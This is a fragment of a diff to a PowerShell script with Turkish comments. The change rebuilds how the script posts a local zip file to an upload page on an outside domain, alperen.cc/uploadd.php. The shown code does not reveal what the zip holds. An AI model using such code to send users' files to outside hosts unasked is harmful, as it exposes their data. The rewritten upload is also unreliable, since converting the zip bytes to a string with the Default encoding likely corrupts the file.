@@ -92,11 +92,25 @@ $url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
 if (Test-Path $zipFilePath) {
     try {
-        $form = @{
-            fileToUpload = Get-Item -Path $zipFilePath
-        }
+        # Multipart form-data oluşturma
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $contentType = "multipart/form-data; boundary=$boundary"
 
-        $response = Invoke-WebRequest -Uri $url -Method Post -Form $form -ErrorAction Stop
+        # Dosya içeriğini oku
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
+
+        # Multipart form-data body oluşturma
+        $body = (
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`n" +
+            "Content-Type: application/zip`r`n`r`n" +
+            [System.Text.Encoding]::Default.GetString($fileBytes) + "`r`n" +
+            "--$boundary--`r`n"
+        )
+
+        # POST isteğini gönder
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $contentType -ErrorAction Stop
 
         # Yanıtı göster
         Write-Output $response
